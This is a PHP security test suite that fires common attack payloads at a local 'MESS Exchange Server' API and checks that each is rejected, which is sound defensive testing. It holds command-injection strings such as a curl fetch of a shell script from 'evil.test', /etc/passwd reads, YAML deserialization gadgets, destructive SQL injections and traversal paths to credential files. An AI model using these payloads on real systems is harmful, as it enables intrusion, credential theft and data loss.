<?php
/**
 * MESS Exchange Server - Offensive Security Test Suite
 *
 * This test suite actively attempts to exploit the server using
 * common attack vectors. All tests should FAIL to exploit.
 *
 * Run: php tests/security_test.php
 */

class SecurityTestSuite
{
    private string $baseUrl;
    private string $apiKey = '';
    private string $exchangeId = 'home';
    private string $threadRef = '';
    private int $passed = 0;
    private int $failed = 0;
    private array $failures = [];

    public function __construct(string $baseUrl = 'http://localhost:8080')
    {
        $this->baseUrl = rtrim($baseUrl, '/');
    }

    public function run(): void
    {
        echo "=== MESS Exchange Server - Offensive Security Test Suite ===\n";
        echo "Target: {$this->baseUrl}\n\n";

        // Setup: Register an executor for authenticated tests
        $this->setup();

        // Run all security test categories
        $this->testPathTraversalAttacks();
        $this->testInjectionAttacks();
        $this->testAuthenticationBypass();
        $this->testAuthorizationBypass();
        $this->testInputFuzzing();
        $this->testHeaderInjection();
        $this->testDenialOfService();
        $this->testInformationDisclosure();
        $this->testBusinessLogicFlaws();

        $this->printSummary();
    }

    private function setup(): void
    {
        // Register a test executor
        $executorId = 'security-test-' . bin2hex(random_bytes(4));
        $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/register", [
            'executor_id' => $executorId,
        ]);

        if ($res['status'] === 201 && !empty($res['body']['api_key'])) {
            $this->apiKey = $res['body']['api_key'];
            echo "Setup: Registered executor '{$executorId}'\n\n";
        } else {
            die("Setup failed: Could not register executor\n");
        }

        // Create a thread for testing
        $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", [
            'intent' => 'Security test thread',
        ], $this->apiKey);

        if ($res['status'] === 201 && !empty($res['body']['ref'])) {
            $this->threadRef = $res['body']['ref'];
        }
    }

    // ============ Path Traversal Attacks ============

    private function testPathTraversalAttacks(): void
    {
        echo "--- Path Traversal Attacks ---\n";

        // Thread ref traversal attempts
        $traversalPayloads = [
            '../../../etc/passwd',
            '..\\..\\..\\etc\\passwd',
            '....//....//....//etc/passwd',
            '..%2f..%2f..%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',  // Double encoding
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%c0%af..%c0%af..%c0%afetc/passwd',  // UTF-8 overlong
            '..%00/etc/passwd',  // Null byte
            "..%0d%0a/etc/passwd",  // CRLF
            '2024-01-01-TEST/../../../etc/passwd',
            '2024-01-01-TEST/..\\..\\..\\etc\\passwd',
            '....//2024-01-01-TEST',
            '.../.../.../etc/passwd',
            '..;/..;/..;/etc/passwd',  // Semicolon bypass
            '..%5c..%5c..%5cetc%5cpasswd',  // Backslash encoded
        ];

        foreach ($traversalPayloads as $payload) {
            $res = $this->get("/api/v1/exchanges/{$this->exchangeId}/requests/{$payload}", $this->apiKey);
            $blocked = in_array($res['status'], [400, 401, 403, 404]);
            $this->assert($blocked, "Path traversal blocked: " . substr($payload, 0, 40));
        }

        // Exchange ID traversal
        $exchangePayloads = [
            '../../../etc',
            'home/../../../etc',
            'home%2f..%2f..%2fetc',
            '..%00home',
        ];

        foreach ($exchangePayloads as $payload) {
            $res = $this->get("/api/v1/exchanges/{$payload}/requests", $this->apiKey);
            $blocked = in_array($res['status'], [400, 401, 403, 404]);
            $this->assert($blocked, "Exchange traversal blocked: " . substr($payload, 0, 30));
        }

        // Attachment filename traversal
        $filenamePayloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            'att-test%2f..%2f..%2fetc%2fpasswd',
            'test%00.txt',  // URL-encoded null byte
        ];

        foreach ($filenamePayloads as $payload) {
            $res = $this->get("/api/v1/exchanges/{$this->exchangeId}/requests/{$this->threadRef}/attachments/{$payload}", $this->apiKey);
            $blocked = in_array($res['status'], [400, 404]);
            $this->assert($blocked, "Filename traversal blocked: " . substr($payload, 0, 30));
        }

        echo "\n";
    }

    // ============ Injection Attacks ============

    private function testInjectionAttacks(): void
    {
        echo "--- Injection Attacks ---\n";

        // Command injection in various fields (these are test payloads, not actual attacks)
        $cmdPayloads = [
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '& whoami',
            '&& curl http://evil.test/shell.sh',
            "\n/bin/sh",
            "\r\ncat /etc/passwd",
        ];

        foreach ($cmdPayloads as $payload) {
            // In intent field
            $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", [
                'intent' => $payload,
            ], $this->apiKey);
            // Should either succeed (safe storage) or reject (400)
            $safe = in_array($res['status'], [201, 400]);
            $this->assert($safe, "Cmd injection in intent safe: " . substr($payload, 0, 25));
        }

        // YAML injection/deserialization attacks
        $yamlPayloads = [
            '!!python/object/apply:os.system ["id"]',
            '!!python/object/new:os.system ["id > /tmp/pwned"]',
            "--- !ruby/object:Gem::Installer\ni: x",
            "!!php/object:O:8:\"stdClass\":0:{}",
            "!!merge\n<<: *default",
        ];

        foreach ($yamlPayloads as $payload) {
            $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", [
                'intent' => $payload,
            ], $this->apiKey);
            $safe = in_array($res['status'], [201, 400]);
            $this->assert($safe, "YAML injection safe: " . substr($payload, 0, 30));
        }

        // SQL injection (should be N/A but test anyway)
        $sqlPayloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM passwords--",
            "admin'--",
            "1; DELETE FROM requests WHERE 1=1",
        ];

        foreach ($sqlPayloads as $payload) {
            $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", [
                'intent' => $payload,
            ], $this->apiKey);
            $safe = in_array($res['status'], [201, 400]);
            $this->assert($safe, "SQL injection safe: " . substr($payload, 0, 25));
        }

        // LDAP injection
        $ldapPayloads = [
            '*)(uid=*))(|(uid=*',
            'admin)(&)',
            '*)((|userPassword=*)',
        ];

        foreach ($ldapPayloads as $payload) {
            $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", [
                'intent' => $payload,
            ], $this->apiKey);
            $safe = in_array($res['status'], [201, 400]);
            $this->assert($safe, "LDAP injection safe: " . substr($payload, 0, 25));
        }

        echo "\n";
    }

    // ============ Authentication Bypass ============

    private function testAuthenticationBypass(): void
    {
        echo "--- Authentication Bypass Attempts ---\n";

        // No auth header
        $res = $this->get("/api/v1/exchanges/{$this->exchangeId}/requests");
        $this->assert($res['status'] === 401, "No auth rejected");

        // Empty bearer token
        $res = $this->get("/api/v1/exchanges/{$this->exchangeId}/requests", 'Bearer ');
        $this->assert($res['status'] === 401, "Empty bearer rejected");

        // Malformed auth headers
        $malformedAuth = [
            'Basic ' . base64_encode('admin:admin'),
            'Bearer',
            'bearer ' . $this->apiKey,  // Wrong case
            'BEARER ' . $this->apiKey,
            "Bearer {$this->apiKey}\x00extra",  // Null byte
            "Bearer {$this->apiKey}\r\nX-Injected: true",  // Header injection
            'Bearer ' . str_repeat('A', 10000),  // Very long token
            'Bearer null',
            'Bearer undefined',
            'Bearer [object Object]',
            "Bearer {$this->apiKey} extra",  // Extra content
        ];

        foreach ($malformedAuth as $auth) {
            $res = $this->rawRequest('GET', "/api/v1/exchanges/{$this->exchangeId}/requests", null, [
                "Authorization: {$auth}",
            ]);
            $this->assert($res['status'] === 401, "Malformed auth rejected: " . substr($auth, 0, 30));
        }

        // Token manipulation
        $manipulatedTokens = [
            substr($this->apiKey, 0, -1),  // Truncated
            $this->apiKey . 'x',  // Extended
            str_replace('_', '-', $this->apiKey),  // Different separator
            strtoupper($this->apiKey),  // Case changed
            'mess_home_' . str_repeat('0', 32),  // Guessed token
            'mess_' . $this->exchangeId . '_admin',  // Privilege escalation attempt
        ];

        foreach ($manipulatedTokens as $token) {
            $res = $this->get("/api/v1/exchanges/{$this->exchangeId}/requests", $token);
            $rejected = in_array($res['status'], [401, 403]);
            $this->assert($rejected, "Manipulated token rejected: " . substr($token, 0, 30));
        }

        // JWT confusion (if applicable)
        $fakeJwt = base64_encode('{"alg":"none"}') . '.' . base64_encode('{"sub":"admin"}') . '.';
        $res = $this->get("/api/v1/exchanges/{$this->exchangeId}/requests", $fakeJwt);
        $this->assert($res['status'] === 401, "Fake JWT rejected");

        echo "\n";
    }

    // ============ Authorization Bypass ============

    private function testAuthorizationBypass(): void
    {
        echo "--- Authorization Bypass Attempts ---\n";

        // Access different exchange
        $res = $this->get("/api/v1/exchanges/other-exchange/requests", $this->apiKey);
        $this->assert($res['status'] === 403, "Cross-exchange access blocked");

        // Register second executor
        $victim = 'victim-' . bin2hex(random_bytes(4));
        $this->post("/api/v1/exchanges/{$this->exchangeId}/register", [
            'executor_id' => $victim,
        ]);

        // Try to update another executor's profile
        $res = $this->patch("/api/v1/exchanges/{$this->exchangeId}/executors/{$victim}", [
            'display_name' => 'Hacked',
        ], $this->apiKey);
        $this->assert($res['status'] === 403, "Cannot modify other executor");

        // IDOR: Try to access thread with manipulated ref
        $fakeRefs = [
            '2020-01-01-0000',
            '9999-99-99-ZZZZ',
            $this->threadRef . '1',
        ];

        foreach ($fakeRefs as $ref) {
            $res = $this->get("/api/v1/exchanges/{$this->exchangeId}/requests/{$ref}", $this->apiKey);
            $this->assert($res['status'] === 404, "IDOR blocked: {$ref}");
        }

        // Parameter pollution
        $res = $this->rawRequest('GET',
            "/api/v1/exchanges/{$this->exchangeId}/requests?exchange_id=admin&exchange_id=root",
            null,
            ["Authorization: Bearer {$this->apiKey}"]
        );
        $this->assert($res['status'] !== 500, "Parameter pollution handled");

        echo "\n";
    }

    // ============ Input Fuzzing ============

    private function testInputFuzzing(): void
    {
        echo "--- Input Fuzzing ---\n";

        // Extremely long inputs
        $longPayloads = [
            str_repeat('A', 100000),   // 100KB
            str_repeat('A', 1000000),  // 1MB
        ];

        foreach ($longPayloads as $i => $payload) {
            $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", [
                'intent' => $payload,
            ], $this->apiKey);
            $handled = $res['status'] !== 500;
            $this->assert($handled, "Long input handled (" . strlen($payload) . " bytes)");
        }

        // Unicode edge cases
        $unicodePayloads = [
            "\xef\xbb\xbfBOM prefix",  // BOM
            "\xc0\x80null",  // Overlong null
            str_repeat("\xf0\x9f\x92\xa9", 1000),  // Many emoji
            "test\xe2\x80\x8b\xe2\x80\x8bzero-width",  // Zero-width chars
            "test\xef\xbf\xbdreplacement",  // Replacement char
        ];

        foreach ($unicodePayloads as $payload) {
            $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", [
                'intent' => $payload,
            ], $this->apiKey);
            $handled = in_array($res['status'], [201, 400]);
            $this->assert($handled, "Unicode handled: " . bin2hex(substr($payload, 0, 10)));
        }

        // Null bytes in various positions
        $nullPayloads = [
            "test\x00",
            "\x00test",
            "te\x00st",
            "test\x00\x00\x00",
        ];

        foreach ($nullPayloads as $payload) {
            $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", [
                'intent' => $payload,
            ], $this->apiKey);
            $handled = in_array($res['status'], [201, 400]);
            $this->assert($handled, "Null byte handled");
        }

        // Malformed JSON
        $malformedJson = [
            '{',
            '{"intent":}',
            '{"intent": undefined}',
            '{"intent": NaN}',
            "{'intent': 'test'}",  // Single quotes
            '{"intent": "test",}',  // Trailing comma
            '{"intent": "test" "extra": "data"}',  // Missing comma
            "\x00{\"intent\": \"test\"}",  // Null prefix
        ];

        foreach ($malformedJson as $json) {
            $res = $this->rawRequest('POST',
                "/api/v1/exchanges/{$this->exchangeId}/requests",
                $json,
                [
                    "Authorization: Bearer {$this->apiKey}",
                    "Content-Type: application/json",
                ]
            );
            $this->assert($res['status'] === 400, "Malformed JSON rejected");
        }

        // Deeply nested JSON
        $depth = 100;
        $nested = str_repeat('{"a":', $depth) . '"test"' . str_repeat('}', $depth);
        $res = $this->rawRequest('POST',
            "/api/v1/exchanges/{$this->exchangeId}/requests",
            $nested,
            [
                "Authorization: Bearer {$this->apiKey}",
                "Content-Type: application/json",
            ]
        );
        $handled = $res['status'] !== 500;
        $this->assert($handled, "Deeply nested JSON handled");

        // Invalid status values
        $invalidStatuses = [
            'ADMIN',
            '../../../etc/passwd',
            '<script>alert(1)</script>',
            str_repeat('A', 1000),
            "pending\x00admin",
        ];

        foreach ($invalidStatuses as $status) {
            $res = $this->patch("/api/v1/exchanges/{$this->exchangeId}/requests/{$this->threadRef}", [
                'status' => $status,
            ], $this->apiKey);
            $this->assert($res['status'] === 400, "Invalid status rejected: " . substr($status, 0, 20));
        }

        // Invalid priority values
        $invalidPriorities = [
            'CRITICAL',
            'admin',
            '../etc/passwd',
            str_repeat('urgent', 100),
        ];

        foreach ($invalidPriorities as $priority) {
            $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", [
                'intent' => 'test',
                'priority' => $priority,
            ], $this->apiKey);
            $this->assert($res['status'] === 400, "Invalid priority rejected: " . substr($priority, 0, 20));
        }

        echo "\n";
    }

    // ============ Header Injection ============

    private function testHeaderInjection(): void
    {
        echo "--- Header Injection Attacks ---\n";

        // CRLF injection in various places
        $crlfPayloads = [
            "test\r\nX-Injected: true",
            "test\r\n\r\n<html>injected</html>",
            "test%0d%0aX-Injected: true",
            "test\nSet-Cookie: session=hacked",
        ];

        foreach ($crlfPayloads as $payload) {
            // In executor ID during registration
            $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/register", [
                'executor_id' => $payload,
            ]);
            $handled = in_array($res['status'], [400, 201]);  // Either rejected or safely stored
            $this->assert($handled, "CRLF in executor_id handled");
        }

        // Host header injection
        $res = $this->rawRequest('GET', '/health', null, [
            'Host: evil.com',
        ]);
        $this->assert($res['status'] === 200, "Host header handled");

        // X-Forwarded-* header abuse
        $res = $this->rawRequest('GET',
            "/api/v1/exchanges/{$this->exchangeId}/requests",
            null,
            [
                "Authorization: Bearer {$this->apiKey}",
                'X-Forwarded-For: 127.0.0.1',
                'X-Forwarded-Host: admin.internal',
            ]
        );
        $this->assert($res['status'] === 200, "X-Forwarded headers handled");

        echo "\n";
    }

    // ============ Denial of Service ============

    private function testDenialOfService(): void
    {
        echo "--- Denial of Service Vectors ---\n";

        // Request flood (limited test)
        $start = microtime(true);
        for ($i = 0; $i < 50; $i++) {
            $this->get('/health');
        }
        $elapsed = microtime(true) - $start;
        $this->assert($elapsed < 30, "50 requests completed in reasonable time");

        // Large array in JSON
        $largeArray = array_fill(0, 10000, 'item');
        $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", [
            'intent' => 'test',
            'context' => $largeArray,
        ], $this->apiKey);
        $handled = $res['status'] !== 500;
        $this->assert($handled, "Large array handled");

        // ReDoS patterns
        $redosPayloads = [
            str_repeat('a', 50) . '!',
            str_repeat('a', 100) . 'X',
        ];

        foreach ($redosPayloads as $payload) {
            $start = microtime(true);
            $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", [
                'intent' => $payload,
            ], $this->apiKey);
            $elapsed = microtime(true) - $start;
            $this->assert($elapsed < 5, "ReDoS pattern handled quickly");
        }

        // Hash collision attempt (for hash-based structures)
        $hashCollision = [];
        for ($i = 0; $i < 100; $i++) {
            $hashCollision[] = "key{$i}";
        }
        $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", [
            'intent' => 'test',
            'context' => $hashCollision,
        ], $this->apiKey);
        $handled = $res['status'] !== 500;
        $this->assert($handled, "Many keys handled");

        echo "\n";
    }

    // ============ Information Disclosure ============

    private function testInformationDisclosure(): void
    {
        echo "--- Information Disclosure ---\n";

        // Error message probing
        $res = $this->get("/api/v1/exchanges/{$this->exchangeId}/requests/invalid-ref", $this->apiKey);
        $noStackTrace = strpos(json_encode($res['body']), 'Stack trace') === false;
        $noFilePath = strpos(json_encode($res['body']), '/app/') === false;
        $this->assert($noStackTrace, "No stack trace in errors");
        $this->assert($noFilePath, "No file paths in errors");

        // Debug endpoints
        $debugPaths = [
            '/debug',
            '/phpinfo',
            '/info.php',
            '/.git/config',
            '/.env',
            '/config.php',
            '/composer.json',
            '/vendor/',
        ];

        foreach ($debugPaths as $path) {
            $res = $this->get($path);
            $blocked = in_array($res['status'], [404, 403, 401]);
            $this->assert($blocked, "Debug path blocked: {$path}");
        }

        // Server header check
        $res = $this->rawRequest('GET', '/health', null, []);
        $serverHeader = '';
        foreach ($res['headers'] as $header) {
            if (stripos($header, 'Server:') === 0) {
                $serverHeader = $header;
            }
        }
        // Having server header is OK, but check it doesn't reveal too much
        $noVersionLeak = strpos($serverHeader, 'Apache/2.4.') === false;
        $this->assert($noVersionLeak, "Server version not leaked");

        // Timing attack on authentication
        $validTokenTime = 0;
        $invalidTokenTime = 0;

        for ($i = 0; $i < 5; $i++) {
            $start = microtime(true);
            $this->get("/api/v1/exchanges/{$this->exchangeId}/requests", $this->apiKey);
            $validTokenTime += microtime(true) - $start;

            $start = microtime(true);
            $this->get("/api/v1/exchanges/{$this->exchangeId}/requests", 'invalid_token_' . $i);
            $invalidTokenTime += microtime(true) - $start;
        }

        // Times should be similar (within 100ms average difference)
        $timeDiff = abs(($validTokenTime / 5) - ($invalidTokenTime / 5));
        $this->assert($timeDiff < 0.1, "No significant timing difference in auth");

        echo "\n";
    }

    // ============ Business Logic Flaws ============

    private function testBusinessLogicFlaws(): void
    {
        echo "--- Business Logic Flaws ---\n";

        // State machine bypass: Try to complete without claiming
        $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", [
            'intent' => 'State test',
        ], $this->apiKey);
        $testRef = $res['body']['ref'] ?? '';

        if ($testRef) {
            // Try to jump directly to completed
            $res = $this->patch("/api/v1/exchanges/{$this->exchangeId}/requests/{$testRef}", [
                'status' => 'completed',
            ], $this->apiKey);
            // This might be allowed (depends on business rules), just ensure no error
            $handled = $res['status'] !== 500;
            $this->assert($handled, "State transition handled");
        }

        // Race condition: Rapid status updates
        $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", [
            'intent' => 'Race test',
        ], $this->apiKey);
        $raceRef = $res['body']['ref'] ?? '';

        if ($raceRef) {
            // Rapid updates (synchronous, but tests handling)
            for ($i = 0; $i < 10; $i++) {
                $this->patch("/api/v1/exchanges/{$this->exchangeId}/requests/{$raceRef}", [
                    'status' => $i % 2 === 0 ? 'claimed' : 'pending',
                ], $this->apiKey);
            }

            $res = $this->get("/api/v1/exchanges/{$this->exchangeId}/requests/{$raceRef}", $this->apiKey);
            $this->assert($res['status'] === 200, "Rapid updates handled");
        }

        // Negative/boundary values
        $boundaryValues = [
            ['priority' => ''],
            ['context' => null],
            ['context' => false],
            ['context' => 0],
            ['response_hints' => ''],
        ];

        foreach ($boundaryValues as $data) {
            $data['intent'] = 'Boundary test';
            $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", $data, $this->apiKey);
            $handled = $res['status'] !== 500;
            $this->assert($handled, "Boundary value handled: " . key($data));
        }

        // Mass assignment: Try to set internal fields
        $res = $this->post("/api/v1/exchanges/{$this->exchangeId}/requests", [
            'intent' => 'Mass assignment test',
            'status' => 'completed',  // Should not be settable
            'ref' => '2020-01-01-FAKE',  // Should not be settable
            'created' => '2020-01-01T00:00:00Z',  // Should not be settable
        ], $this->apiKey);

        if ($res['status'] === 201) {
            $createdRef = $res['body']['ref'] ?? '';
            $notFake = $createdRef !== '2020-01-01-FAKE';
            $this->assert($notFake, "Mass assignment of ref blocked");

            $statusPending = ($res['body']['status'] ?? '') === 'pending';
            $this->assert($statusPending, "Mass assignment of status blocked");
        }

        echo "\n";
    }

    // ============ HTTP Helpers ============

    private function get(string $path, ?string $token = null): array
    {
        $headers = [];
        if ($token) {
            $headers[] = "Authorization: Bearer {$token}";
        }
        return $this->rawRequest('GET', $path, null, $headers);
    }

    private function post(string $path, array $data, ?string $token = null): array
    {
        $headers = ['Content-Type: application/json'];
        if ($token) {
            $headers[] = "Authorization: Bearer {$token}";
        }
        return $this->rawRequest('POST', $path, json_encode($data), $headers);
    }

    private function patch(string $path, array $data, ?string $token = null): array
    {
        $headers = ['Content-Type: application/json'];
        if ($token) {
            $headers[] = "Authorization: Bearer {$token}";
        }
        return $this->rawRequest('PATCH', $path, json_encode($data), $headers);
    }

    private function rawRequest(string $method, string $path, ?string $body = null, array $headers = []): array
    {
        $ch = curl_init($this->baseUrl . $path);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CUSTOMREQUEST => $method,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_HEADER => true,
            CURLOPT_TIMEOUT => 30,
        ]);

        if ($body !== null) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        }

        $response = curl_exec($ch);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        $headerStr = substr($response, 0, $headerSize);
        $bodyStr = substr($response, $headerSize);

        return [
            'status' => $status,
            'headers' => explode("\r\n", trim($headerStr)),
            'body' => json_decode($bodyStr, true) ?? [],
            'raw' => $bodyStr,
        ];
    }

    // ============ Assertions ============

    private function assert(bool $condition, string $message): void
    {
        if ($condition) {
            $this->passed++;
            echo "  [PASS] {$message}\n";
        } else {
            $this->failed++;
            $this->failures[] = $message;
            echo "  [FAIL] {$message}\n";
        }
    }

    private function printSummary(): void
    {
        $total = $this->passed + $this->failed;
        $passRate = $total > 0 ? round(($this->passed / $total) * 100, 1) : 0;

        echo "============================================\n";
        echo "Security Test Results\n";
        echo "--------------------------------------------\n";
        echo "   Passed: {$this->passed}\n";
        echo "   Failed: {$this->failed}\n";
        echo "   Total:  {$total}\n";
        echo "   Rate:   {$passRate}%\n";
        echo "============================================\n";

        if ($this->failed > 0) {
            echo "\nFailures:\n";
            foreach ($this->failures as $failure) {
                echo "   - {$failure}\n";
            }
        } else {
            echo "\nAll security tests passed!\n";
        }
    }
}

// Run the tests
$suite = new SecurityTestSuite();
$suite->run();
